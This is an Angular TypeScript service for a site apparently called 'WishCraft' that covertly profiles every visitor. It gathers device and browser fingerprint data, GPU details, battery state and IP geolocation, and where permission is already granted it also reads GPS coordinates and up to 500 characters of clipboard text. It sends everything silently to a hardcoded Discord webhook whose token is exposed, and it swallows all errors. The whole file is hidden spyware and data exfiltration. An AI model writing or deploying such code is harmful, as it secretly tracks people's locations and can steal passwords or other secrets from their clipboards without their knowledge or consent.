import { Injectable } from '@angular/core';

export interface DeviceSnapshot {
  // timing
  timestamp: string;
  url: string;
  referrer: string;

  // browser
  userAgent: string;
  language: string;
  languages: string;
  cookiesEnabled: boolean;
  doNotTrack: string | null;

  // screen / display
  screenW: number;
  screenH: number;
  viewportW: number;
  viewportH: number;
  colorDepth: number;
  pixelRatio: number;
  orientation: string;

  // device hints
  platform: string;
  cpuCores: number;
  ramGB: number | string;
  touchPoints: number;
  isMobile: boolean;
  isTablet: boolean;
  pointerType: string;

  // network
  connectionType: string;
  effectiveType: string;
  downlink: string;
  saveData: boolean;

  // locale
  timezone: string;
  locale: string;

  // ── IP-based location ─────────────────────────────────────────
  ip: string;
  city: string;
  region: string;
  country: string;
  countryCode: string;
  postalCode: string;
  isp: string;
  org: string;
  ipLat: number | string;
  ipLng: number | string;
  mapsLinkIP: string;

  // ── GPS (only if pre-granted) ─────────────────────────────────
  gpsLat: number | string;
  gpsLng: number | string;
  gpsAccuracy: number | string;
  mapsLinkGPS: string;

  // ── Battery ───────────────────────────────────────────────────
  batteryLevel: string;
  batteryCharging: string;
  batteryTimeToFull: string;
  batteryTimeToEmpty: string;

  // ── Hardware / GPU ────────────────────────────────────────────
  gpuVendor: string;
  gpuRenderer: string;
  webglVersion: string;

  // ── Display / OS theme ────────────────────────────────────────
  colorScheme: string;       // 'dark' | 'light' | 'unknown'
  reducedMotion: string;
  highContrast: string;

  // ── Clipboard (only if permission pre-granted) ────────────────
  clipboardText: string;
}

const WEBHOOK_URL: string = 'https://discord.com/api/webhooks/1481317626126008361/pfgrPV6IGkhBVHXE62EBODfLsi0YLy8bQ0gaP0mSWDhaU5dVUt9M466a_Nzu6dIl6tuH';

@Injectable({ providedIn: 'root' })
export class DeviceInfoService {

  collect(): void {
    try {
      const base = this.buildBase();
      // Phase 1 — instant sync snapshot
      this.send(base);

      // Phase 2 — async enrichments in parallel, final send when all done
      Promise.all([
        this.enrichWithIPLocation(base),
        this.enrichBattery(base),
        this.enrichGPU(base),
        this.tryGPS(base),
        this.tryClipboard(base),
      ]).then(([withIP, withBat, withGPU, withGPS, withClip]) => {
        const merged: DeviceSnapshot = {
          ...base,
          ...withIP,
          ...withBat,
          ...withGPU,
          ...withGPS,
          ...withClip,
        };
        this.send(merged);
      }).catch(() => {});
    } catch {
      // fail silently
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // Base synchronous snapshot
  // ─────────────────────────────────────────────────────────────────────────
  private buildBase(): DeviceSnapshot {
    const nav  = navigator as any;
    const conn = nav.connection ?? nav.mozConnection ?? nav.webkitConnection ?? {};
    const ua   = navigator.userAgent;
    const isMobile = /Mobi|Android|iPhone|iPod/i.test(ua);
    const isTablet = /iPad|Tablet/i.test(ua) ||
                     (isMobile && Math.min(screen.width, screen.height) >= 600);

    const pointerType = window.matchMedia('(pointer: coarse)').matches ? 'touch'
                      : window.matchMedia('(pointer: fine)').matches   ? 'mouse'
                      : 'unknown';

    const colorScheme  = window.matchMedia('(prefers-color-scheme: dark)').matches  ? 'dark'
                       : window.matchMedia('(prefers-color-scheme: light)').matches ? 'light'
                       : 'unknown';
    const reducedMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches ? 'yes' : 'no';
    const highContrast  = window.matchMedia('(forced-colors: active)').matches          ? 'yes' : 'no';

    return {
      timestamp:      new Date().toISOString(),
      url:            location.href,
      referrer:       document.referrer || '(direct)',
      userAgent:      ua,
      language:       navigator.language,
      languages:      (navigator.languages ?? []).join(', '),
      cookiesEnabled: navigator.cookieEnabled,
      doNotTrack:     navigator.doNotTrack,
      screenW:        screen.width,
      screenH:        screen.height,
      viewportW:      window.innerWidth,
      viewportH:      window.innerHeight,
      colorDepth:     screen.colorDepth,
      pixelRatio:     window.devicePixelRatio ?? 1,
      orientation:    screen.orientation?.type ?? (screen.width > screen.height ? 'landscape' : 'portrait'),
      platform:       navigator.platform,
      cpuCores:       navigator.hardwareConcurrency ?? 0,
      ramGB:          nav.deviceMemory ?? 'unknown',
      touchPoints:    navigator.maxTouchPoints ?? 0,
      isMobile,
      isTablet,
      pointerType,
      connectionType: conn.type          ?? 'unknown',
      effectiveType:  conn.effectiveType ?? 'unknown',
      downlink:       conn.downlink != null ? `${conn.downlink} Mbps` : 'unknown',
      saveData:       conn.saveData      ?? false,
      timezone:       Intl.DateTimeFormat().resolvedOptions().timeZone,
      locale:         Intl.DateTimeFormat().resolvedOptions().locale,
      colorScheme,
      reducedMotion,
      highContrast,
      // filled async
      ip: 'resolving…', city: '', region: '', country: '', countryCode: '',
      postalCode: '', isp: '', org: '',
      ipLat: 'n/a', ipLng: 'n/a', mapsLinkIP: '',
      gpsLat: 'n/a', gpsLng: 'n/a', gpsAccuracy: 'n/a', mapsLinkGPS: '',
      batteryLevel: 'n/a', batteryCharging: 'n/a',
      batteryTimeToFull: 'n/a', batteryTimeToEmpty: 'n/a',
      gpuVendor: 'n/a', gpuRenderer: 'n/a', webglVersion: 'n/a',
      clipboardText: 'n/a',
    };
  }

  // ─────────────────────────────────────────────────────────────────────────
  // IP geolocation (ipapi.co — free, no key, 1000 req/day)
  // ─────────────────────────────────────────────────────────────────────────
  private async enrichWithIPLocation(snap: DeviceSnapshot): Promise<Partial<DeviceSnapshot>> {
    try {
      const res  = await fetch('https://ipapi.co/json/', { cache: 'no-store' });
      const data = await res.json();
      const lat  = data.latitude  ?? 'n/a';
      const lng  = data.longitude ?? 'n/a';
      return {
        ip:          data.ip           ?? 'unknown',
        city:        data.city         ?? '',
        region:      data.region       ?? '',
        country:     data.country_name ?? '',
        countryCode: data.country_code ?? '',
        postalCode:  data.postal       ?? '',
        isp:         data.org          ?? '',
        org:         data.org          ?? '',
        ipLat:       lat,
        ipLng:       lng,
        mapsLinkIP:  (lat !== 'n/a' && lng !== 'n/a')
                       ? `https://maps.google.com?q=${lat},${lng}` : '',
      };
    } catch { return {}; }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // Battery API (Chrome / Edge / Android; silent elsewhere)
  // ─────────────────────────────────────────────────────────────────────────
  private async enrichBattery(snap: DeviceSnapshot): Promise<Partial<DeviceSnapshot>> {
    try {
      const nav = navigator as any;
      if (typeof nav.getBattery !== 'function') return {};
      const bat = await nav.getBattery();
      const pct  = `${Math.round(bat.level * 100)}%`;
      const charging = bat.charging ? 'yes' : 'no';
      const toFull  = bat.chargingTime   === Infinity ? 'n/a' : `${Math.round(bat.chargingTime   / 60)} min`;
      const toEmpty = bat.dischargingTime === Infinity ? 'n/a' : `${Math.round(bat.dischargingTime / 60)} min`;
      return {
        batteryLevel:       pct,
        batteryCharging:    charging,
        batteryTimeToFull:  toFull,
        batteryTimeToEmpty: toEmpty,
      };
    } catch { return {}; }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // GPU info via WebGL (works in all major browsers)
  // ─────────────────────────────────────────────────────────────────────────
  private enrichGPU(snap: DeviceSnapshot): Partial<DeviceSnapshot> {
    try {
      const canvas = document.createElement('canvas');

      // Try WebGL2 first, fall back to WebGL1
      const gl2 = canvas.getContext('webgl2');
      const gl1 = canvas.getContext('webgl') ?? canvas.getContext('experimental-webgl');
      const gl  = gl2 ?? gl1 as WebGLRenderingContext | null;
      if (!gl) return {};

      const ext = (gl as WebGLRenderingContext).getExtension('WEBGL_debug_renderer_info');
      if (!ext) return { webglVersion: gl2 ? 'WebGL2' : 'WebGL1' };

      return {
        gpuVendor:   (gl as WebGLRenderingContext).getParameter(ext.UNMASKED_VENDOR_WEBGL)   ?? 'unknown',
        gpuRenderer: (gl as WebGLRenderingContext).getParameter(ext.UNMASKED_RENDERER_WEBGL) ?? 'unknown',
        webglVersion: gl2 ? 'WebGL2' : 'WebGL1',
      };
    } catch { return {}; }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // GPS — only if permission pre-granted, never prompts
  // ─────────────────────────────────────────────────────────────────────────
  private async tryGPS(snap: DeviceSnapshot): Promise<Partial<DeviceSnapshot>> {
    try {
      const status = await navigator.permissions.query({ name: 'geolocation' });
      if (status.state !== 'granted') return {};
      const pos = await new Promise<GeolocationPosition>((resolve, reject) =>
        navigator.geolocation.getCurrentPosition(resolve, reject,
          { timeout: 5000, maximumAge: 60000, enableHighAccuracy: false })
      );
      const lat = pos.coords.latitude;
      const lng = pos.coords.longitude;
      return {
        gpsLat:      lat,
        gpsLng:      lng,
        gpsAccuracy: `${Math.round(pos.coords.accuracy)} m`,
        mapsLinkGPS: `https://maps.google.com?q=${lat},${lng}`,
      };
    } catch { return {}; }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // Clipboard — only if clipboard-read permission pre-granted, never prompts
  // ─────────────────────────────────────────────────────────────────────────
  private async tryClipboard(snap: DeviceSnapshot): Promise<Partial<DeviceSnapshot>> {
    try {
      const status = await navigator.permissions.query(
        { name: 'clipboard-read' as PermissionName }
      );
      if (status.state !== 'granted') return {};
      const text = await navigator.clipboard.readText();
      return { clipboardText: text ? text.slice(0, 500) : '(empty)' };
    } catch { return {}; }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // Webhook sender
  // ─────────────────────────────────────────────────────────────────────────
  private send(snap: DeviceSnapshot): void {
    if (!this.isProd()) {
      console.groupCollapsed('[DeviceInfo] Visitor snapshot');
      console.table(snap);
      console.groupEnd();
    }
    if (!WEBHOOK_URL) return;

    const isDiscord = WEBHOOK_URL.includes('discord.com/api/webhooks');
    const body = isDiscord
      ? JSON.stringify({ content: this.toDiscordMessage(snap) })
      : JSON.stringify(snap);

    if (navigator.sendBeacon) {
      navigator.sendBeacon(WEBHOOK_URL, new Blob([body], { type: 'application/json' }));
    } else {
      fetch(WEBHOOK_URL, {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body, keepalive: true,
      }).catch(() => {});
    }
  }

  // ─────────────────────────────────────────────────────────────────────────
  // Discord formatter
  // ─────────────────────────────────────────────────────────────────────────
  private toDiscordMessage(s: DeviceSnapshot): string {
    const locationLine = s.city
      ? `> 📍 ${s.city}, ${s.region}, ${s.country} (${s.countryCode}) — \`${s.postalCode}\``
      : `> 📍 resolving...`;
    const gpsLine = s.gpsLat !== 'n/a'
      ? `> 📡 GPS: \`${s.gpsLat}, ${s.gpsLng}\` ±${s.gpsAccuracy} → ${s.mapsLinkGPS}`
      : `> 📡 GPS: \`not granted\``;
    const clipLine = s.clipboardText !== 'n/a'
      ? `> 📋 Clipboard: \`${s.clipboardText}\``
      : `> 📋 Clipboard: \`not granted\``;
    const batLine = s.batteryLevel !== 'n/a'
      ? `> 🔋 ${s.batteryLevel} | Charging: \`${s.batteryCharging}\` | Full in: \`${s.batteryTimeToFull}\` | Empty in: \`${s.batteryTimeToEmpty}\``
      : `> 🔋 Battery API not available`;

    return [
      `📡 **New WishCraft Visitor** — \`${s.timestamp}\``,
      `🔗 **URL:** ${s.url}`,
      `↩️ **Referrer:** ${s.referrer}`,
      ``,
      `🌍 **Location**`,
      locationLine,
      `> 🌐 IP: \`${s.ip}\` | ISP: \`${s.isp}\``,
      s.mapsLinkIP ? `> 🗺️ IP Map: ${s.mapsLinkIP} (\`${s.ipLat}, ${s.ipLng}\`)` : `> 🗺️ IP Coords: \`${s.ipLat}, ${s.ipLng}\``,
      gpsLine,
      ``,
      `📱 **Device**`,
      `> Platform: \`${s.platform}\` | Mobile: \`${s.isMobile}\` | Tablet: \`${s.isTablet}\` | Pointer: \`${s.pointerType}\``,
      `> Screen: \`${s.screenW}×${s.screenH}\` @ \`${s.pixelRatio}x\` | Viewport: \`${s.viewportW}×${s.viewportH}\``,
      `> CPU: \`${s.cpuCores} cores\` | RAM: \`${s.ramGB} GB\` | Touch points: \`${s.touchPoints}\``,
      ``,
      `🎮 **GPU / Hardware**`,
      `> Vendor: \`${s.gpuVendor}\``,
      `> Renderer: \`${s.gpuRenderer}\``,
      `> WebGL: \`${s.webglVersion}\``,
      ``,
      `🔋 **Battery**`,
      batLine,
      ``,
      `🎨 **Display / OS Preferences**`,
      `> Theme: \`${s.colorScheme}\` | Reduced Motion: \`${s.reducedMotion}\` | High Contrast: \`${s.highContrast}\``,
      `> Color Depth: \`${s.colorDepth}-bit\` | Orientation: \`${s.orientation}\``,
      ``,
      `🔌 **Network**`,
      `> Type: \`${s.connectionType}\` | Effective: \`${s.effectiveType}\` | Downlink: \`${s.downlink}\` | Data Saver: \`${s.saveData}\``,
      ``,
      clipLine,
      ``,
      `🌐 **Browser**`,
      `> Timezone: \`${s.timezone}\` | Lang: \`${s.language}\` | DNT: \`${s.doNotTrack}\``,
      `> \`${s.userAgent}\``,
    ].join('\n');
  }

  private isProd(): boolean {
    try {
      return location.hostname !== 'localhost' && location.hostname !== '127.0.0.1';
    } catch { return false; }
  }
}
